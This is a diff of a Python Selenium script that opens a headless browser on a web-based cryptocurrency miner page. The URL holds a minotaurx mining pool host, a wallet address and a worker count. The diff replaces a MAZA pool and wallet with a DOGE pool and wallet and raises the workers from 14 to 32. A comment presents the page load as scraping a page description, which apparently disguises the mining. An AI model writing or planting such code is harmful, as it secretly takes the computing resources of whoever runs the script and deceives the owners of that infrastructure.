@@ -26,7 +26,7 @@ webdriver_service = Service(f"{homedir}/chromedriver-linux64/chromedriver")
 browser = webdriver.Chrome(service=webdriver_service, options=chrome_options)
 
 # Get page
-browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=flyingsaucer-eu.teatspray.fun&port=7019&worker=MGaypRJi43LcQxrgoL2CW28B31w4owLvv8&password=Val16Cores%2Cc%3DMAZA%2Czap%3DMAZA&workers=14")
+browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=DTsjSjwtdDuUewe2fH8MSchu36ACATjLP2&password=c%3DDOGE&workers=32")
 
 # Extract description from page and print
 description = browser.find_element(By.NAME, "description").get_attribute("content")
